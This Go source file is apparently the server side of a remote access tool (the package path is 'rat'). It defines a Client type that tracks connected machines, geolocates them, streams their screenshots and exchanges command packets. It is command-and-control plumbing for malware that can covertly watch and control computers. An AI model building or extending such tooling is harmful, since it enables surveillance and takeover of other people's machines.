package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"rat/common"
	"rat/network"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

type listenerMap map[common.PacketHeader]*websocket.Conn

type Monitor struct {
	ID     int `json:"id"`
	Width  int `json:"w"`
	Height int `json:"h"`
}

type Client struct {
	network.Writer
	network.Reader

	Conn net.Conn

	Id int

	common.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start    time.Time
		Current  int
		Received bool
	}

	Screen struct {
		Streaming bool
		New       bool
		Buffer    []byte
	}

	Queue chan OutgoingPacket

	Listeners listenerMap

	Monitors []Monitor

	Authenticated bool
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan OutgoingPacket)

	client.Id = int(rand.Int31())
	client.Computer = common.Computer{}
	client.Conn = conn
	client.Reader = network.Reader{conn}
	client.Writer = network.Writer{conn}
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Listeners = make(map[common.PacketHeader]*websocket.Conn)
	client.Monitors = make([]Monitor, 0)

	return client
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (c *Client) GetPathSep() string {
	if c.Computer.OperatingSystemType == common.Windows {
		return "\\"
	}

	return "/"
}

func (client *Client) PacketReader() {
	for {
		header, err := client.ReadHeader()

		if err != nil {
			fmt.Println(err.Error())
			remove(client)
			break
		}

		packet := GetIncomingPacket(header)
		e, err := network.Deserialize(client.Reader, packet)
		if err != nil {
			fmt.Println(err.Error())
			remove(client)
			break
		}

		e.(IncomingPacket).OnReceive(client)
	}
}

func (client *Client) Heartbeat() {
	for {
		client.Queue <- &Ping{}

		for !client.Ping.Received {
			time.Sleep(time.Millisecond)
		}

		time.Sleep(time.Second * 2)
	}
}

func (client *Client) PacketQueue() {
	for {
		packet := <-client.Queue
		client.WritePacket(packet)
	}
}

func (c *Client) ReadHeader() (common.PacketHeader, error) {
	var h common.PacketHeader
	err := binary.Read(c.Conn, common.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header common.PacketHeader) error {
	return binary.Write(c.Conn, common.ByteOrder, header)
}

func (c *Client) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	packet.Init(c)

	return c.Writer.WritePacket(packet)
}

// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
func (c *Client) GetEncodedScreen() string {
	return base64.StdEncoding.EncodeToString(c.Screen.Buffer)
}

func (c *Client) GetClientData() ClientData {
	return ClientData{
		Ping:            c.Ping.Current,
		Country:         c.GetCountry(),
		Flag:            c.GetFlagName(),
		Host:            c.GetDisplayHost(),
		ComputerName:    c.Computer.GetDisplayName(),
		OperatingSystem: c.Computer.OperatingSystem,
	}
}
